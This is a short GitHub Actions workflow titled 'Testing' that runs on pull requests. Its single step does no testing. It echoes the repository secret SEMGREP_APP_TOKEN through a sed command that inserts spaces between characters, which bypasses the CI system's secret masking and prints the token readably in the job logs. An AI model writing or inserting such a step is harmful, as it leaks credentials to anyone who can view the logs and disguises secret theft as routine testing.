name: Testing

on:
  pull_request:
      branches:
        - main

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Run a one-line script
      run: echo ${{secrets.SEMGREP_APP_TOKEN }} | sed 's/./& /g'
